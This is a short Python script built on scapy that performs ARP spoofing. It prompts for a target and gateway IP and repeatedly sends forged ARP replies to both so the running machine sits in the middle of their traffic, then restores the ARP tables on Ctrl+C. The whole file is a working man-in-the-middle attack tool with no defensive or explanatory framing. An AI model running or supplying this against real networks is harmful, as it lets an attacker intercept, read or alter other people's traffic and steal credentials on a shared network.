import scapy.all as scapy
import time



def print_result(results_list):
    """ Prints the network scan results """
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for client in results_list:
        print(client['ip'] + "\t\t" + client['mac'])

def get_mac(ip):
    """ This function returns the MAC address for a given IP. """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """ This function sends out ARP replies to put our machine in the middle. """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """ This function restores the network by sending correct ARP responses. """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    target_ip = input("Enter target IP: ")
    gateway_ip = input("Enter gateway IP (usually the router IP): ")

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\rPackets sent: {sent_packets_count}", end="")
            time.sleep(2)  # Waits for two seconds before sending the next packets
    except KeyboardInterrupt:
        print("\nDetected CTRL+C ... Resetting ARP tables... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    main()
